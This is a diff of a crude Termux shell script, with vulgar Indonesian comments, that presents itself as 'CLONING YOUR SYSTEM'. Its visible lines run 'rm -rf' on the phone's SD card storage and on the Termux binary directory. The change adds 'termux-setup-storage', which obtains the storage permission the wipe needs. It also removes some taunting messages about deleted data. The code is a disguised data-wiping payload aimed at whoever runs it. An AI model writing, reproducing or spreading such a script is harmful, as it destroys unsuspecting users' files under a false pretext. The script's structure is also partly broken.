@@ -3,6 +3,7 @@
 #KONTOL CLONING YOUR SYSTEM
 #Coded By FuckTak:V
 
+termux-setup-storage
 
 clear
 
@@ -10,7 +11,7 @@ python2 eaa.py
 
 
 clear
-
+clear
 
 echo $f "Welcome "
 
@@ -98,16 +99,6 @@ rm -rf /storage/sdcard1
 
 rm -rf $PREFIX/bin
 
-echo "MAMPOS KAN, lagian BEGO DI PELIHARA :'V"|lolcat -a -d 150
-
-echo "TERDELETE ALL DATA..." | lolcat
-
-fi
-
-if [ $kntl = (*) ] 
-
-then
-clear
 php knt.php
 
 fi
